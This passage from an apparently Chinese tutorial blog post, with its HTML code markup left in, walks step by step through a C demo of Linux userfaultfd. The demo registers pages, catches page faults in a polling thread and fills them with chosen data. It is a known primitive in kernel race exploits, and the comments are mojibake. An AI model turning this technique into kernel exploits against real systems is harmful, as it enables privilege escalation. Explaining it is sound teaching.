class-name">pollfd</span> pollfd<span class="token punctuation">;</span>    <span class="token keyword">long</span> uffd<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">int</span> fault_cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      uffd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>arg<span class="token punctuation">;</span>      dummy_page <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span>                      MAP_PRIVATE <span class="token operator">|</span> MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>dummy_page <span class="token operator">==</span> MAP_FAILED<span class="token punctuation">)</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"mmap(dummy)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] fault_handler_thread: waiting for page fault..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pollfd<span class="token punctuation">.</span>fd <span class="token operator">=</span> uffd<span class="token punctuation">;</span>    pollfd<span class="token punctuation">.</span>events <span class="token operator">=</span> POLLIN<span class="token punctuation">;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pollfd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>pollfd<span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> POLLERR <span class="token operator">||</span> pollfd<span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> POLLHUP<span class="token punctuation">)</span>        <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"poll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* ãƒšãƒ¼ã‚¸ãƒ•ã‚©ãƒ«ãƒˆå¾…æ©Ÿ */</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"read(uffd)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">assert</span> <span class="token punctuation">(</span>msg<span class="token punctuation">.</span>event <span class="token operator">==</span> UFFD_EVENT_PAGEFAULT<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] uffd: flag=0x%llx\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>flags<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] uffd: addr=0x%llx\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* è¦æ±‚ã•ã‚ŒãŸãƒšãƒ¼ã‚¸ã¨ã—ã¦è¿”ã™ãƒ‡ãƒ¼ã‚¿ã‚’è¨­å®š */</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>fault_cnt<span class="token operator">++</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>dummy_page<span class="token punctuation">,</span> <span class="token string">"Hello, World! (1)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">else</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>dummy_page<span class="token punctuation">,</span> <span class="token string">"Hello, World! (2)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      copy<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>dummy_page<span class="token punctuation">;</span>      copy<span class="token punctuation">.</span>dst <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>address <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0xfff</span><span class="token punctuation">;</span>      copy<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">0x1000</span><span class="token punctuation">;</span>      copy<span class="token punctuation">.</span>mode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      copy<span class="token punctuation">.</span>copy <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_COPY<span class="token punctuation">,</span> <span class="token operator">&amp;</span>copy<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"ioctl(UFFDIO_COPY)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">register_uffd</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_api</span> uffdio_api<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_register</span> uffdio_register<span class="token punctuation">;</span>    <span class="token keyword">long</span> uffd<span class="token punctuation">;</span>    <span class="token class-name">pthread_t</span> th<span class="token punctuation">;</span>      <span class="token comment">/* userfaultfdã®ä½œæˆ */</span>    uffd <span class="token operator">=</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_userfaultfd<span class="token punctuation">,</span> O_CLOEXEC <span class="token operator">|</span> O_NONBLOCK<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>uffd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"userfaultfd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      uffdio_api<span class="token punctuation">.</span>api <span class="token operator">=</span> UFFD_API<span class="token punctuation">;</span>    uffdio_api<span class="token punctuation">.</span>features <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_API<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_api<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>      <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"ioctl(UFFDIO_API)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/* ãƒšãƒ¼ã‚¸ã‚’userfaultfdã«ç™»éŒ² */</span>    uffdio_register<span class="token punctuation">.</span>range<span class="token punctuation">.</span>start <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>addr<span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>range<span class="token punctuation">.</span>len <span class="token operator">=</span> len<span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>mode <span class="token operator">=</span> UFFDIO_REGISTER_MODE_MISSING<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_REGISTER<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_register<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>      <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"UFFDIO_REGISTER"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/* ãƒšãƒ¼ã‚¸ãƒ•ã‚©ãƒ«ãƒˆã‚’å‡¦ç†ã™ã‚‹ã‚¹ãƒ¬ãƒƒãƒ‰ã‚’ä½œæˆ */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> fault_handler_thread<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>uffd<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"pthread_create"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>page<span class="token punctuation">;</span>    page <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0x2000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span>                MAP_PRIVATE <span class="token operator">|</span> MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>page <span class="token operator">==</span> MAP_FAILED<span class="token punctuation">)</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"mmap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">register_uffd</span><span class="token punctuation">(</span>page<span class="token punctuation">,</span> <span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/* ã‚¹ãƒ¬ãƒƒãƒ‰ä¸­ã®putsã¨futexã§ãƒãƒ³ã‚°ã™ã‚‹ã®ã§ç›´æ¥printfã§å‡ºåŠ›ã—ãªã„ */</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x0000: %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page <span class="token operator">+</span> <span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x1000: %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x0000: %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page <span class="token operator">+</span> <span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x1000: %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸‹é¢æˆ‘ä»¬æ¥çœ‹çœ‹è¿™æ˜¯å¦‚ä½•è¿›è¡Œçš„ï¼š</p><ol><li><p>è¿™é‡Œç”¨ mmap åˆ†ä¸€ä¸ªåŒ¿åé¡µç”¨ä½œåç»­è¢«ç›‘è§†çš„åŒºåŸŸ</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>page<span class="token punctuation">;</span>    page <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0x2000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span>                MAP_PRIVATE <span class="token operator">|</span> MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//mmapåˆ†é…ä¸¤ä¸ªåŒ¿åé¡µç”¨ä½œåç»­è¢«ç›‘è§†çš„åŒºåŸŸ </span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>page <span class="token operator">==</span> MAP_FAILED<span class="token punctuation">)</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"mmap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>è´Ÿè´£ä¸ºç›‘è§†åŒºåŸŸæ³¨å†Œuserfaultfdï¼Œå¹¶å¯åŠ¨è½®è¯¢çº¿ç¨‹fault_handler_threadï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">register_uffd</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//å¯åŠ¨userfaultfd  </span>  <span class="token keyword">struct</span> <span class="token class-name">uffdio_api</span> uffdio_api<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_register</span> uffdio_register<span class="token punctuation">;</span>    <span class="token keyword">long</span> uffd<span class="token punctuation">;</span>    <span class="token class-name">pthread_t</span> th<span class="token punctuation">;</span>      <span class="token comment">/* é€šè¿‡ userfaultfd ç³»ç»Ÿè°ƒç”¨æ³¨å†Œä¸€ä¸ª userfaultfdï¼Œå…¶ä¸­ O_CLOEXEC å’Œ O_NONBLOCK å’Œ open çš„ flags ç›¸åŒï¼Œç¬”è€…ä¸ªäººè®¤ä¸ºè¿™é‡Œå¯ä»¥ç†è§£ä¸ºæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªè™šæ‹Ÿè®¾å¤‡ userfault*/</span>    uffd <span class="token operator">=</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_userfaultfd<span class="token punctuation">,</span> O_CLOEXEC <span class="token operator">|</span> O_NONBLOCK<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>uffd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"userfaultfd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      uffdio_api<span class="token punctuation">.</span>api <span class="token operator">=</span> UFFD_API<span class="token punctuation">;</span>    uffdio_api<span class="token punctuation">.</span>features <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_API<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_api<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>      <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"ioctl(UFFDIO_API)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/* ä¸ºè¿™å—å†…å­˜åŒºåŸŸæ³¨å†Œ userfaultfd */</span>    uffdio_register<span class="token punctuation">.</span>range<span class="token punctuation">.</span>start <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>addr<span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>range<span class="token punctuation">.</span>len <span class="token operator">=</span> len<span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>mode <span class="token operator">=</span> UFFDIO_REGISTER_MODE_MISSING<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_REGISTER<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_register<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>      <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"UFFDIO_REGISTER"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/* å¯åŠ¨è½®è¯¢çº¿ç¨‹ï¼Œæ¥ä¸‹æ¥ä¾¿æ˜¯ç­‰å¾…ç¼ºé¡µå¼‚å¸¸çš„è¿‡ç¨‹ */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> fault_handler_thread<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>uffd<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"pthread_create"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>è½®è¯¢çº¿ç¨‹uffd moniterï¼Œè´Ÿè´£æ£€æŸ¥ç¼ºé¡µå¼‚å¸¸å¹¶å¤„ç†</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">fault_handler_thread</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//moniterçº¿ç¨‹  </span>  <span class="token keyword">char</span> <span class="token operator">*</span>dummy_page<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">uffd_msg</span> msg<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_copy</span> copy<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">pollfd</span> pollfd<span class="token punctuation">;</span>    <span class="token keyword">long</span> uffd<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">int</span> fault_cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      uffd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>arg<span class="token punctuation">;</span>  <span class="token comment">/*mmapåˆ†é…ä¸€ä¸ª1kçš„å†…å­˜é¡µdummy_pageï¼Œè¿™ä¸ªé¡µé¢ç”¨äºæ¥å—è¿”å›çš„æ•°æ®ã€‚*/</span>  dummy_page <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span>                      MAP_PRIVATE <span class="token operator">|</span> MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>dummy_page <span class="token operator">==</span> MAP_FAILED<span class="token punctuation">)</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"mmap(dummy)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/*åˆ›å»ºpoofdå¹¶å¯åŠ¨poll()è¿›è¡Œè½®è¯¢ï¼Œç›‘æ§è¯»äº‹ä»¶*/</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] fault_handler_thread: waiting for page fault..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pollfd<span class="token punctuation">.</span>fd <span class="token operator">=</span> uffd<span class="token punctuation">;</span>    pollfd<span class="token punctuation">.</span>events <span class="token operator">=</span> POLLIN<span class="token punctuation">;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pollfd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>pollfd<span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> POLLERR <span class="token operator">||</span> pollfd<span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> POLLHUP<span class="token punctuation">)</span>        <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"poll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* è¯»å–è¿”å›çš„uffd_msgä¿¡æ¯ */</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"read(uffd)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">assert</span> <span class="token punctuation">(</span>msg<span class="token punctuation">.</span>event <span class="token operator">==</span> UFFD_EVENT_PAGEFAULT<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] uffd: flag=0x%llx\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>flags<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] uffd: addr=0x%llx\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* userfaultfdå¤„ç†ç¨‹åºï¼šé€šè¿‡ioctlå¤„ç†å¼‚å¸¸ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯UFFDIO_COPYï¼Œå°†ç”¨æˆ·è‡ªå®šä¹‰æ•°æ®å†™åˆ°dummy     pageï¼Œå†æ‹·è´åˆ°faulting pageä¸Š */</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>fault_cnt<span class="token operator">++</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>dummy_page<span class="token punctuation">,</span> <span class="token string">"Hello, World! (1)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">else</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>dummy_page<span class="token punctuation">,</span> <span class="token string">"Hello, World! (2)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      copy<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>dummy_page<span class="token punctuation">;</span>      copy<span class="token punctuation">.</span>dst <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>address <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0xfff</span><span class="token punctuation">;</span>      copy<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">0x1000</span><span class="token punctuation">;</span>      copy<span class="token punctuation">.</span>mode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      copy<span class="token punctuation">.</span>copy <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_COPY<span class="token punctuation">,</span> <span class="token operator">&amp;</span>copy<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"ioctl(UFFDIO_COPY)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>ä¸»çº¿ç¨‹è§¦å‘å¼‚å¸¸</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//...</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token 